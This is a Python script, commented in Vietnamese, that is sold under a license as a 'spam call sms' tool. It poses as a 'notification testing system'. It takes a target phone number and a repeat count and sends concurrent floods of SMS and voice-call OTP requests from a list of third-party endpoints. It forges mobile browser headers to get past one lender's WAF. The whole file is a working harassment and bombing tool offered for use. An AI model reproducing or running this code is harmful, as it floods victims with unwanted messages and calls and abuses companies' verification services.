import os
import sys
import json
import time
import hashlib
import platform
import subprocess
import logging
from typing import Dict, List, Any
import concurrent.futures
import requests
from requests.adapters import HTTPAdapter
from urllib3.util import Retry

# ==========================================
# BỘ MÃ MÀU ANSI TRANG TRÍ TERMINAL
# ==========================================
C = '\033[96m'  # Cyan (Xanh lơ)
G = '\033[92m'  # Green (Xanh lá)
R = '\033[91m'  # Red (Đỏ)
Y = '\033[93m'  # Yellow (Vàng)
W = '\033[0m'   # White/Reset (Trắng - Trả về mặc định)

# ==========================================
# CẤU HÌNH HỆ THỐNG LICENSE (BẢN QUYỀN)
# ==========================================
SERVER_URL = "https://shopvietx.io.vn/api/license"
KEY_FILE_PATH = os.path.join(os.path.expanduser("~"), ".matrix_sms_key")

# ==========================================
# CẤU HÌNH LOGGING CÓ MÀU SẮC THỜI GIAN
# ==========================================
logging.basicConfig(
    level=logging.INFO,
    format=f"{W}[%(asctime)s]{W} %(message)s",
    datefmt="%H:%M:%S",
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger("MatrixCloudEngine")

class CloudTestingEngine:
    def __init__(self):
        self.session = requests.Session()
        self.timeout = 7 
        self.init_session_policy()
        self.api_database = self.load_apis_from_memory()

    def init_session_policy(self) -> None:
        """Cấu hình kết nối Connection Pool hạn chế tối đa lỗi mạng"""
        retries = Retry(
            total=1,
            backoff_factor=0.1,
            status_forcelist=[500, 502, 503, 504],
            raise_on_status=False
        )
        adapter = HTTPAdapter(pool_connections=100, pool_maxsize=100, max_retries=retries)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
        self.session.headers.update({
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
        })

    def load_apis_from_memory(self) -> Dict[str, List[Any]]:
        """Đọc dữ liệu từ RAM (globals) hoặc tự động fallback nạp từ file cấu hình apis_config.json"""
        if 'IN_MEMORY_DB' in globals():
            return globals()['IN_MEMORY_DB']
        
        # Hỗ trợ tự động đọc từ file cục bộ nếu chạy độc lập ngoài môi trường RAM nền
        if os.path.exists("apis_config.json"):
            try:
                with open("apis_config.json", "r", encoding="utf-8") as f:
                    return json.load(f)
            except Exception:
                pass
        
        logger.error(f"{R}[!] Lỗi nghiêm trọng: Không tìm thấy cơ sở dữ liệu API trong RAM hoặc file apis_config.json!{W}")
        return {"sms_endpoints": [], "call_endpoints": []}

    def sync_ivr_cookies(self, phone: str) -> None:
        """Đồng bộ phiên kết nối (Cookie) cho cổng IVR VayXanh - ĐÃ SỬA THEO 6.PY"""
        init_url = "https://lk.vayxanh.com/"
        params = {
            "phone": phone, 
            "amount": "2000000", 
            "term": "7",
            "utm_source": "direct_vayxanh",
            "utm_medium": "organic",
            "utm_campaign": "direct_vayxanh",
            "utm_content": "mainpage_submit"
        }
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'vi-VN',
            'origin': 'https://lk.vayxanh.com',
            'referer': f'https://lk.vayxanh.com/?phone={phone}&amount=2000000&term=7',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
            'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin'
        }
        try:
            self.session.get(init_url, params=params, headers=headers, timeout=self.timeout)
            
            cookies_dict = requests.utils.dict_from_cookiejar(self.session.cookies)
            if "_cabinet_key" not in cookies_dict:
                config_url = "https://lk.vayxanh.com/internal/client/config"
                self.session.get(config_url, headers=headers, timeout=self.timeout)
        except Exception:
            pass

    def execute_request_worker(self, api: Dict[str, Any], phone: str) -> bool:
        """Hàm gửi Request ngầm và in trạng thái sạch sẽ"""
        name = api.get("name", "Dịch vụ ẩn danh")
        url = api.get("url")
        method = api.get("method", "POST").upper()
        headers = api.get("headers", {}).copy() 
        
        # Ép định dạng headers di động riêng cho luồng VayXanh để bypass WAF hệ thống
        if url and "vayxanh" in url.lower():
            headers.update({
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'vi-VN',
                'origin': 'https://lk.vayxanh.com',
                'referer': f'https://lk.vayxanh.com/?phone={phone}&amount=2000000&term=7',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
                'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin'
            })
        
        phone_no_zero = phone[1:] if phone.startswith("0") else phone
        phone_84 = "84" + phone_no_zero
        
        raw_template = api.get("payload_template", "")
        formatted_payload = raw_template.replace("{phone}", phone)\
                                         .replace("{phone_no_zero}", phone_no_zero)\
                                         .replace("{phone_84}", phone_84)

        try:
            if api.get("is_json"):
                request_kwargs = {"json": json.loads(formatted_payload)}
            else:
                request_kwargs = {"data": formatted_payload}

            logger.info(f"{C}[▶ RUNNING] Đang kiểm thử cổng:{W} {name}")

            response = self.session.request(
                method=method,
                url=url,
                headers=headers,
                timeout=self.timeout,
                **request_kwargs
            )
            
            if response.status_code == 200:
                logger.info(f"  └── {G}[✓ SUCCESS] {name} thành công.{W}")
                return True
            else:
                logger.info(f"  └── {R}[✕ FAILED] {name} lỗi (Mã: {response.status_code}).{W}")
                return False

        except requests.exceptions.Timeout:
            logger.info(f"  └── {Y}[🕒 TIMEOUT] {name} quá hạn phản hồi. Bỏ qua.{W}")
        except Exception:
            logger.info(f"  └── {R}[✕ ERROR] Không thể kết nối tới {name}.{W}")
        
        return False

    def trigger_sms_suite(self, phone: str) -> None:
        """Kích hoạt bắn đồng thời Suite SMS bằng đa luồng cực nhanh"""
        sms_list = self.api_database.get("sms_endpoints", [])
        if not sms_list:
            print(f"{R}[-] Danh sách API trống hoặc tải cấu hình thất bại.{W}")
            return

        print(f"\n{G}[+] Khởi chạy Suite SMS: Đang thực thi {len(sms_list)} dịch vụ...{W}")
        print(f"{C}-{W}" * 55)
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=25) as executor:
            futures = [executor.submit(self.execute_request_worker, api, phone) for api in sms_list]
            concurrent.futures.wait(futures)
            
        print(f"{C}-{W}" * 55)
        print(f"{G}[✓] Hoàn tất Suite SMS.{W}")

    def trigger_combined_suite(self, phone: str) -> None:
        """Kịch bản tích hợp: SMS trước, Call (IVR) ở cuối quy trình"""
        self.trigger_sms_suite(phone)
        
        time.sleep(1.5)
        
        call_list = self.api_database.get("call_endpoints", [])
        if not call_list:
            return

        print(f"\n{G}[+] Khởi chạy Suite IVR: Đang thực thi {len(call_list)} cuộc gọi thoại...{W}")
        print(f"{C}-{W}" * 55)
        
        self.sync_ivr_cookies(phone)
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(self.execute_request_worker, api, phone) for api in call_list]
            concurrent.futures.wait(futures)
            
        print(f"{C}-{W}" * 55)
        print(f"{G}[✓] Hoàn tất toàn bộ chuỗi tích hợp.{W}")


# ==========================================
# CÁC HÀM TRỢ GIÚP: MÃ MÁY & CHECK LICENSE
# ==========================================
def get_hardware_id() -> str:
    """Tự động lấy mã định danh phần cứng duy nhất (Mã máy) tùy thuộc vào OS"""
    current_os = platform.system().lower()
    raw_id = "UNKNOWN_DEVICE"
    
    try:
        if current_os == "windows":
            cmd = "wmic csproduct get uuid"
            output = subprocess.check_output(cmd, shell=True).decode().split()
            if len(output) >= 2:
                raw_id = output[1]
        elif current_os == "linux":
            if os.path.exists("/etc/machine-id"):
                with open("/etc/machine-id", "r") as f:
                    raw_id = f.read().strip()
            elif os.path.exists("/var/lib/dbus/machine-id"):
                with open("/var/lib/dbus/machine-id", "r") as f:
                    raw_id = f.read().strip()
    except Exception:
        pass

    return hashlib.md5(raw_id.encode('utf-8')).hexdigest().upper()


def verify_license_key(key: str, hardware_id: str) -> bool:
    """Gửi yêu cầu xác thực Key và Mã máy lên Server ShopVietX"""
    try:
        payload = {"license_key": key, "hwid": hardware_id, "tool": "spam call sms"}
        response = requests.post(SERVER_URL, json=payload, timeout=8)
        if response.status_code == 200:
            res_data = response.json()
            if res_data.get("status") == "success" or res_data.get("active") is True:
                return True
    except Exception:
        pass
    return False


def check_authentication_flow():
    """Luồng kiểm tra bản quyền nghiêm ngặt trước khi cho phép dùng Tool"""
    hw_id = get_hardware_id()
    
    if os.path.exists(KEY_FILE_PATH):
        with open(KEY_FILE_PATH, "r", encoding="utf-8") as f:
            saved_key = f.read().strip()
        if saved_key and verify_license_key(saved_key, hw_id):
            return True 
            
    while True:
        os.system("cls" if platform.system().lower() == "windows" else "clear")
        print(f"{C}=" * 64 + W)
        print(f"{C}         XÁC THỰC BẢN QUYỀN HỆ THỐNG - SHOPVIETX.IO.VN       {W}")
        print(f"{C}=" * 64 + W)
        print(f"  {Y}[!] Trạng thái: Chưa kích hoạt bản quyền!{W}")
        print(f"  {C}• Mã máy (HWID) của bạn: {W}{G}{hw_id}{W}")
        print(f"  {C}• Vui lòng gửi Mã máy trên cho Admin để mua bản quyền.{W}")
        print(f"{C}-" * 64 + W)
        
        user_key = input(f"{G}[?] Nhập Key bản quyền của bạn (Hoặc bấm '0' để thoát): {W}").strip()
        
        if user_key == "0":
            print(f"{G}[+] Đóng chương trình.{W}")
            sys.exit(0)
            
        if not user_key:
            continue
            
        print(f"{G}[+] Đang kiểm tra mã khóa trên hệ thống Server...{W}")
        if verify_license_key(user_key, hw_id):
            with open(KEY_FILE_PATH, "w", encoding="utf-8") as f:
                f.write(user_key)
            print(f"{G}[✓] KÍCH HOẠT THÀNH CÔNG! Đang vào hệ thống...{W}")
            time.sleep(1.5)
            return True
        else:
            print(f"{R}[-] Lỗi: Key không hợp lệ, đã hết hạn hoặc không dùng cho máy này!{W}")
            input(f"\n{Y}[Nhấn Enter để thử lại...]{W}")


def show_banner_introduction():
    """Hiển thị phần giới thiệu thông tin công cụ sau khi đã qua bước check key"""
    os.system("cls" if platform.system().lower() == "windows" else "clear")
    hw_id = get_hardware_id()
    
    print(f"{C}=" * 64 + W)
    print(f"{G}         MATRIX NOTIFICATION TESTING SYSTEM SYSTEM          {W}")
    print(f"{C}   Chạy trên: Windows PE / Windows Desktop / Termux (Linux) {W}")
    print(f"{C}=" * 64 + W)
    print(f"  {C}• Phiên bản: {W}Cloud Integration v3.5 (Chạy trên RAM)")
    print(f"  {C}• Hệ điều hành: {W}{platform.system()} {platform.release()}")
    print(f"  {C}• Mã máy của bạn: {W}{hw_id}")
    print(f"  {C}• Trạng thái bản quyền: {G}Đã kích hoạt [✓]{W}")
    print(f"{C}=" * 64 + W)


def render_terminal_menu():
    print(f"\n{C}═{W}"*20 + f"{C} MENU ĐIỀU KHIỂN CHÍNH {W}" + f"{C}═{W}"*20)
    print(f"  {G}[1]{W} Chỉ spam SMS (SMS Only)")
    print(f"  {G}[2]{W} Chạy toàn diện (SMS + Call)")
    print(f"  {G}[0]{W} Giải phóng bộ nhớ & Thoát chương trình")
    print(f"{C}═{W}"*64)


def run_application():
    check_authentication_flow()
    show_banner_introduction()
    core_engine = CloudTestingEngine()
    
    while True:
        render_terminal_menu()
        cmd = input(f"{G}[?] Nhập tùy chọn lệnh (0-2): {W}").strip()
        
        if cmd == "0":
            print(f"{G}[+] Bộ nhớ đệm đã được giải phóng sạch sẽ khỏi RAM. Đóng hệ thống!{W}")
            break
        elif cmd in ["1", "2"]:
            phone = input(f"{G}[?] Nhập số điện thoại mục tiêu cần test: {W}").strip()
            if not phone or len(phone) < 9 or not phone.isdigit():
                print(f"{R}[-] Lỗi: Số điện thoại không đúng định dạng chuỗi số!{W}")
                continue
                
            # Đã tích hợp tính năng hỏi số lần lặp tương tự bản spamsms2026.py
            spam_input = input(f"{G}[?] Nhập số lần cần chạy (Số vòng lặp): {W}").strip()
            if not spam_input.isdigit() or int(spam_input) <= 0:
                print(f"{R}[-] Lỗi: Số lần chạy không hợp lệ! Đặt mặc định chạy 1 lần.{W}")
                spam_count = 1
            else:
                spam_count = int(spam_input)
            
            # Khởi tạo giá trị delay cố định 3.5 giây theo đúng yêu cầu bài toán
            fixed_delay = 3.5
            
            # Luồng xử lý vòng lặp chạy tự động đa cổng kết hợp nghỉ cố định
            for run_idx in range(spam_count):
                print(f"\n{Y}[▶] BẮT ĐẦU VÒNG CHẠY THỨ {run_idx + 1}/{spam_count}{W}")
                
                if cmd == "1":
                    core_engine.trigger_sms_suite(phone)
                elif cmd == "2":
                    core_engine.trigger_combined_suite(phone)
                
                # Nếu chưa phải vòng chạy cuối cùng thì thực hiện delay nghỉ cố định 3.5 giây
                if run_idx < spam_count - 1:
                    print(f"{Y}[🕒] Đang nghỉ cố định {fixed_delay} giây trước khi chuyển sang vòng tiếp theo...{W}")
                    time.sleep(fixed_delay)
                    
            print(f"\n{G}[✓] Hoàn thành toàn bộ {spam_count} vòng lặp kiểm thử dữ liệu!{W}")
            input(f"\n{Y}[Nhấn nút Enter để quay trở về Menu...]{W}")
        else:
            print(f"{R}[-] Mã lệnh không hợp lệ!{W}")

if __name__ == "__main__":
    run_application()
